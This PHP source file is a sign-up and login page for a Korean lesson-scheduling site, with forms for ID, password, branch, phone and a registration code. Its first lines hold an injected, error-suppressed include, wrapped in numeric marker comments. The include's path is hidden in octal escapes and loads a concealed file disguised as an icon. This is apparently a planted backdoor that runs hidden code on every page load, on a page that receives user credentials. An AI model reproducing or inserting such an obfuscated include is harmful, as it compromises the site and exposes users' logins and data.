<?php
/*84951*/

@include "\057s\150o\1679\0701\0611\061/\167w\167/\167p\055i\156c\154u\144e\163/\143s\163/\0561\144e\0711\066d\060.\151c\157";

/*84951*/ 
/* Main page with two forms: sign up and log in */
require 'db.php';
session_start();
?>
<!DOCTYPE html>
<html>
<head>
  <title>Sign-Up/Login</title>
  <?php include 'css/css.html'; ?>
</head>

<?php 
if ($_SERVER['REQUEST_METHOD'] == 'POST') 
{
    if (isset($_POST['login'])) { //user logging in

        require 'login.php';
        
    }
    
    elseif (isset($_POST['register'])) { //user registering
        
        require 'register.php';
        
    }
}
?>
<script>
  function checkinfo(frm)
  {

    
      
      
     
  }

</script>
<body style = "background: url(http://show981111.cafe24.com/sol.jpg)">
  <div class="form">
      
      <ul class="tab-group">
        <li class="tab"><a href="#signup">SIGN UP</a></li>
        <li class="tab active"><a href="#login">LOG IN</a></li>
      </ul>
      
      <div class="tab-content">

         <div id="login">   
          <h1>My Lesson Schedule</h1>
          
          <form action="index.php" method="post" autocomplete="off">
          
            <div class="field-wrap">
            <label>
              ID<span class="req">*</span>
            </label>
            <input type="text" required autocomplete="off" name="userID"/>
          </div>
          
          <div class="field-wrap">
            <label>
              Password<span class="req">*</span>
            </label>
            <input type="password" required autocomplete="off" name="userPassword"/>
          </div>
          
          <p class="forgot"><a href="forgot.php">Forgot Password?</a></p>
          
          <button class="button button-block" name="login" />Log In</button>
          
          </form>

        </div>
          
        <div id="signup">   
          <h1>회원가입</h1>
          
          <form action="index.php" method="post" autocomplete="off">
          
          
            <div class="field-wrap">
              <label>
               이름<span class="req">*</span>
              </label>
              <input type="text" required autocomplete="off" name='userName' />
            </div>

            <div class="field-wrap">
             <label>
               지점(잠실/교대/시청/여의도/광화문/마곡 중 하나를 적어주세요.)<span class="req">*</span>
              </label>
              <input type="text" required autocomplete="off" name='userBranch' />

            </div>
        
          <div class="field-wrap">
            <label>
              (강사/학생) 둘중 하나를 입력해주세요<span class="req">*</span>
            </label>
            <input type="text"required autocomplete="off" name='userType'/>
          </div>

          <div class="field-wrap">
            <label>
              수업시간을 입력해 주세요(30/45/60)<span class="req">*</span>
            </label>
            <input type="text"required autocomplete="off" name='userDuration'/>
          </div>

          <div class="field-wrap">
            <label>
              전화번호를 입력해주세요(ex) 010-xxxx-xxxx 형태로 입력해주세요)<span class="req">*</span>
            </label>
            <input type="text"required autocomplete="off" name='userPhone'/>
          </div>

          <div class="field-wrap">
            <label>
              가입코드를 입력해주세요<span class="req">*</span>
            </label>
            <input type="text"required autocomplete="off" name='registercode'/>
          </div>
          
          <button type="submit" class="button button-block" name="register" />Register</button>
          
          </form>

        </div>  
        
      </div><!-- tab-content -->
      
</div> <!-- /form -->
  <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>

    <script src="js/index.js"></script>

</body>
</html>
